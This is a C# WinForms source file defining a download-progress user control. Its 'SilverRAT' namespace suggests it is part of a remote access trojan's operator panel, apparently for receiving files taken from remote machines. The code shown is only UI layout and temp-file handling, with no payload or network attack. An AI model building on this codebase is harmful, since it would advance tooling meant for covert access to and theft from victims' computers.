using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using System;
using System.ComponentModel;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class DownloadUserControl1 : UserControl
{
    public object SyncLock = new object();

    public FileStream FS;

    public bool IsRunning = false;

    private IContainer components = null;

    private BunifuLabel FileName;

    private BunifuLabel PathFile;

    private BunifuShadowPanel bunifuShadowPanel_0;

    private BunifuSeparator bunifuSeparator1;

    public BunifuLoader WaitingDownload;

    public BunifuLabel TitleForm;

    public Guna2CircleProgressBar Progss;

    private Guna2CircleButton ButtClose;

    public string TitleFile { get; set; }

    public string Path_Files { get; set; }

    public string ExtraFileTemp { get; set; }

    public string SaveFile { get; set; }

    public long SizeFile { get; set; }

    public DownloadUserControl1()
    {
        InitializeComponent();
    }

    private void DownloadUserControl1_Load(object sender, EventArgs e)
    {
        FileName.Text = TitleFile;
        PathFile.Text = Path_Files;
    }

    public void CreateFile()
    {
        ExtraFileTemp = GetTemporaryDirectory();
        try
        {
            if (File.Exists(ExtraFileTemp))
            {
                File.Delete(ExtraFileTemp);
            }
        }
        catch
        {
        }
        FS = new FileStream(ExtraFileTemp, FileMode.Append);
    }

    public string GetTemporaryDirectory()
    {
        return Path.Combine(Path.GetTempPath(), TitleFile.Split('.')[0]);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        IsRunning = false;
        base.Visible = false;
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.DownloadUserControl1));
        this.FileName = new Bunifu.UI.WinForms.BunifuLabel();
        this.PathFile = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuShadowPanel_0 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.WaitingDownload = new Bunifu.UI.WinForms.BunifuLoader();
        this.Progss = new Guna.UI2.WinForms.Guna2CircleProgressBar();
        this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.TitleForm = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuShadowPanel_0.SuspendLayout();
        base.SuspendLayout();
        this.FileName.AllowParentOverrides = false;
        this.FileName.AutoEllipsis = false;
        this.FileName.AutoSize = false;
        this.FileName.Cursor = System.Windows.Forms.Cursors.Default;
        this.FileName.CursorType = System.Windows.Forms.Cursors.Default;
        this.FileName.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold);
        this.FileName.ForeColor = System.Drawing.Color.Black;
        this.FileName.Location = new System.Drawing.Point(110, 42);
        this.FileName.Name = "FileName";
        this.FileName.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.FileName.Size = new System.Drawing.Size(607, 17);
        this.FileName.TabIndex = 1;
        this.FileName.Text = "--";
        this.FileName.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.FileName.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.PathFile.AllowParentOverrides = false;
        this.PathFile.AutoEllipsis = false;
        this.PathFile.AutoSize = false;
        this.PathFile.Cursor = System.Windows.Forms.Cursors.Hand;
        this.PathFile.CursorType = System.Windows.Forms.Cursors.Hand;
        this.PathFile.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.PathFile.ForeColor = System.Drawing.Color.Gray;
        this.PathFile.Location = new System.Drawing.Point(110, 65);
        this.PathFile.Name = "PathFile";
        this.PathFile.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.PathFile.Size = new System.Drawing.Size(607, 15);
        this.PathFile.TabIndex = 2;
        this.PathFile.Text = "--";
        this.PathFile.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.PathFile.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuShadowPanel_0.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel_0.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel_0.BorderRadius = 0;
        this.bunifuShadowPanel_0.BorderThickness = 1;
        this.bunifuShadowPanel_0.Controls.Add(this.ButtClose);
        this.bunifuShadowPanel_0.Controls.Add(this.WaitingDownload);
        this.bunifuShadowPanel_0.Controls.Add(this.Progss);
        this.bunifuShadowPanel_0.Controls.Add(this.bunifuSeparator1);
        this.bunifuShadowPanel_0.Controls.Add(this.TitleForm);
        this.bunifuShadowPanel_0.Controls.Add(this.FileName);
        this.bunifuShadowPanel_0.Controls.Add(this.PathFile);
        this.bunifuShadowPanel_0.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel_0.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel_0.Location = new System.Drawing.Point(3, 3);
        this.bunifuShadowPanel_0.Name = "bunifuShadowPanel19";
        this.bunifuShadowPanel_0.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel_0.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel_0.ShadowColor = System.Drawing.Color.FromArgb(224, 224, 224);
        this.bunifuShadowPanel_0.ShadowDept = 2;
        this.bunifuShadowPanel_0.ShadowDepth = 5;
        this.bunifuShadowPanel_0.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel_0.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel_0.Size = new System.Drawing.Size(729, 102);
        this.bunifuShadowPanel_0.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel_0.TabIndex = 596;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(700, 11);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 601;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.WaitingDownload.AllowStylePresets = true;
        this.WaitingDownload.BackColor = System.Drawing.Color.Transparent;
        this.WaitingDownload.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.WaitingDownload.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WaitingDownload.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.WaitingDownload.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.WaitingDownload.Customization = "";
        this.WaitingDownload.DashWidth = 0.5f;
        this.WaitingDownload.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.WaitingDownload.Image = null;
        this.WaitingDownload.Location = new System.Drawing.Point(13, 20);
        this.WaitingDownload.Name = "WaitingDownload";
        this.WaitingDownload.NoRounding = false;
        this.WaitingDownload.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.WaitingDownload.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.WaitingDownload.ShowText = false;
        this.WaitingDownload.Size = new System.Drawing.Size(66, 60);
        this.WaitingDownload.Speed = 7;
        this.WaitingDownload.TabIndex = 599;
        this.WaitingDownload.Text = "bunifuLoader1";
        this.WaitingDownload.TextPadding = new System.Windows.Forms.Padding(0);
        this.WaitingDownload.Thickness = 6;
        this.WaitingDownload.Transparent = true;
        this.Progss.BackColor = System.Drawing.Color.Transparent;
        this.Progss.FillColor = System.Drawing.Color.White;
        this.Progss.FillThickness = 1;
        this.Progss.Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.Progss.ForeColor = System.Drawing.Color.White;
        this.Progss.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
        this.Progss.Image = (System.Drawing.Image)resources.GetObject("Progss.Image");
        this.Progss.ImageSize = new System.Drawing.Size(30, 30);
        this.Progss.Location = new System.Drawing.Point(13, 17);
        this.Progss.Name = "Progss";
        this.Progss.ProgressColor = System.Drawing.Color.FromArgb(0, 192, 0);
        this.Progss.ProgressColor2 = System.Drawing.Color.Green;
        this.Progss.ProgressEndCap = System.Drawing.Drawing2D.LineCap.Triangle;
        this.Progss.ProgressOffset = 8;
        this.Progss.ProgressStartCap = System.Drawing.Drawing2D.LineCap.Round;
        this.Progss.ProgressThickness = 6;
        this.Progss.ShadowDecoration.Parent = this.Progss;
        this.Progss.Size = new System.Drawing.Size(69, 69);
        this.Progss.TabIndex = 597;
        this.Progss.UseTransparentBackground = true;
        this.Progss.Value = 10;
        this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
        this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
        this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator1.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator1.LineThickness = 1;
        this.bunifuSeparator1.Location = new System.Drawing.Point(86, 11);
        this.bunifuSeparator1.Name = "bunifuSeparator1";
        this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
        this.bunifuSeparator1.Size = new System.Drawing.Size(14, 83);
        this.bunifuSeparator1.TabIndex = 571;
        this.TitleForm.AllowParentOverrides = false;
        this.TitleForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.TitleForm.AutoEllipsis = false;
        this.TitleForm.AutoSize = false;
        this.TitleForm.Cursor = System.Windows.Forms.Cursors.Default;
        this.TitleForm.CursorType = System.Windows.Forms.Cursors.Default;
        this.TitleForm.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.TitleForm.ForeColor = System.Drawing.Color.Gray;
        this.TitleForm.Location = new System.Drawing.Point(110, 20);
        this.TitleForm.Name = "TitleForm";
        this.TitleForm.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitleForm.Size = new System.Drawing.Size(309, 17);
        this.TitleForm.TabIndex = 568;
        this.TitleForm.Text = "Downloading...";
        this.TitleForm.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitleForm.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.Controls.Add(this.bunifuShadowPanel_0);
        base.Name = "DownloadUserControl1";
        base.Size = new System.Drawing.Size(737, 112);
        base.Load += new System.EventHandler(DownloadUserControl1_Load);
        this.bunifuShadowPanel_0.ResumeLayout(false);
        base.ResumeLayout(false);
    }
}
